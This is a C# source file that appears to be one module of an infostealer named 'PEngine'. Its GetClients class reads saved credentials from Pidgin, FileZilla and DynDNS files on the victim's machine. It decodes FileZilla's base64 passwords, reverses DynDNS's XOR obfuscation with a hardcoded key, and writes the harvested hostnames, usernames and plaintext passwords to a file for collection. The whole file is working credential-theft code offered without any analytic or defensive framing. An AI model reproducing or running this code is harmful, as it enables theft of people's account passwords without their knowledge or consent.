namespace PEngine.Engine.Others
{
    using PEngine.Helpers;
    using PEngine.Main;
    using System;
    using System.Globalization;
    using System.IO;
    using System.Text;
    using System.Xml;

    public class GetClients
    {
        private static StringBuilder love = new StringBuilder();

        private static string DecryptFZ(string Text) => Encoding.UTF8.GetString(Convert.FromBase64String(Text));

        private static string DecryptDynDns(string encrypted)
        {
            string decoded = string.Empty;
            for (int i = 0; i < encrypted.Length; i += 2)
            {
                decoded += (char)int.Parse(encrypted.Substring(i, 2), NumberStyles.HexNumber);
            }
            char[] outcome = decoded.ToCharArray();
            char[] chars = new char[decoded.Length];
            int lPtr = 0;

            for (int i = 0; i < chars.Length; i++)
            {
                try
                {
                    int second = Convert.ToChar("t6KzXhCh".Substring(lPtr, 1));
                    chars[i] = (char)(outcome[i] ^ second);
                    lPtr = (lPtr + 1) % 8;
                }
                catch (FormatException) { }
                catch (ArgumentOutOfRangeException) { }
            }
            return new string(chars);
        }

        public static void Inizialize()
        {
            #region Pidgin

            if (File.Exists(GlobalPath.PidPurple))
            {
                try
                {
                    using (TextReader tr = new StreamReader(GlobalPath.PidPurple))
                    {
                        var rd = new XmlTextReader(tr) { DtdProcessing = DtdProcessing.Prohibit };
                        var xs = new XmlDocument() { XmlResolver = null };
                        xs.Load(rd);
                        {
                            love.AppendLine("[Pidgin - Manager]");
                            foreach (XmlNode nl in xs.DocumentElement.ChildNodes)
                            {
                                XmlNodeList il = nl.ChildNodes;
                                love.AppendLine($"Protocol: {il[0].InnerText}");
                                love.AppendLine($"UserName: {il[1].InnerText}");
                                love.AppendLine($"Password: {il[2].InnerText}{Environment.NewLine}");
                            }
                        }
                    }
                }
                catch { }
            }

            #endregion

            #region FileZilla

            if (File.Exists(GlobalPath.FZilla))
            {
                try
                {
                    var xf = new XmlDocument() { XmlResolver = null };
                    xf.Load(GlobalPath.FZilla);
                    XmlNodeList bb = xf.GetElementsByTagName("RecentServers");
                    XmlNodeList bs = ((XmlElement)bb[0]).GetElementsByTagName("Server");
                    love.AppendLine("[FileZilla - Manager]");
                    foreach (XmlElement va in bs)
                    {
                        love.AppendLine($"HostName: {va.GetElementsByTagName("Host")[0].InnerText}");
                        love.AppendLine($"Port: {va.GetElementsByTagName("Port")[0].InnerText}");
                        love.AppendLine($"UserName: {va.GetElementsByTagName("User")[0].InnerText}");
                        love.AppendLine($"Password: {DecryptFZ(va.GetElementsByTagName("Pass")[0].InnerText)}{Environment.NewLine}");
                    }
                }
                catch { }
            }

            #endregion

            #region DynDNS

            if (File.Exists(GlobalPath.DynDns))
            {
                string[] lines = File.ReadAllLines(GlobalPath.DynDns);
                love.AppendLine("[DynDns - Manager]");
                love.AppendLine($"UserName: {lines[1].Substring(9)}");
                love.AppendLine($"Password: {DecryptDynDns(lines[2].Substring(9))}{Environment.NewLine}");
            }

            #endregion

            SaveData.SaveFile(GlobalPath.MessangerHome, love?.ToString());
            CheckSize(GlobalPath.MessangerHome);
        }

        private static void CheckSize(string filename)
        {
            try
            {
                if (new FileInfo(filename).Length == 0)
                {
                    CombineEx.DeleteFile(filename);
                }
            }
            catch (IOException) { }
            catch (UnauthorizedAccessException) { }
            catch (ArgumentException) { }
        }
    }
}